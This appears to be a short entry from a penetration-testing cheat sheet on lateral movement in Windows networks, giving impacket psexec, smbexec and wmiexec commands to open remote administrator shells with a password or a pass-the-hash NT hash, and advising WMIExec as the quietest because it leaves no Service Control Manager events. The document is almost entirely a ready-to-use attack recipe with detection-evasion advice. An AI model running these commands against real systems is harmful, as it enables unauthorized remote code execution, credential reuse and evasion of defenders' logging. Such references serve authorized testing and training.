# 18.03 PsExec SMBExec WMIExec

> Spawn remote admin shells over SMB via PsExec (service), SMBExec (pipe), or WMIExec (DCOM) — WMIExec is the quietest.

## Overview

Three flavors of remote admin via SMB. PsExec creates a service. SMBExec uses the SMB pipe directly. WMIExec uses DCOM/WMI — slightly stealthier than service-based.

## Steps

- **Need local admin** on target (member of Administrators).
- **impacket-psexec / smbexec / wmiexec** with PtH or password.
- **WMI is quietest** — no Service Control Manager events.

## Commands

### Three of a kind

```bash
impacket-psexec <DOMAIN>/<USER>:<PASS>@<TARGET>
impacket-smbexec <DOMAIN>/<USER>:<PASS>@<TARGET>
impacket-wmiexec <DOMAIN>/<USER>:<PASS>@<TARGET>
# With hash
impacket-wmiexec -hashes :<NT> <DOMAIN>/<USER>@<TARGET>
```
